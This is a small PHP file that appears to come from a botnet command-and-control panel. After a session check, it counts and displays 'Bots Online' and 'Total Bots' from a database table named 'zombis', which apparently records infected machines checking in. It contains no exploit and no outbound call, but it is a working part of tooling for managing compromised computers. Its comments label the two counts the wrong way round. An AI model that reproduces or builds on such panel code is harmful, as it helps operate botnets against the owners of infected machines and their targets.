<?php @session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }	?>
<?php
require_once('../includes.php');

$f = date("Y-m-d"); ;
$h = date("H:i:s"); ;
$h2 = date("H:i:s",strtotime("-2 minute"));  

$FE = $DB->Select("SELECT * FROM zombis WHERE time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" , 'num_rows' , false); ///TOTAL BOTS
$FE2 = $DB->Select("SELECT * FROM zombis" , 'num_rows' , false); /// ONLINE BOTS


?>
<font color="#B8B8B8" size="1" face="Verdana">Bots Online : </font> 
<font face="Verdana" size="1" color="#00CC00"><?php echo $FE; ?></font><font color="#B8B8B8" size="1" face="Verdana"> | Total Bots : <?php echo $FE2; ?> </font>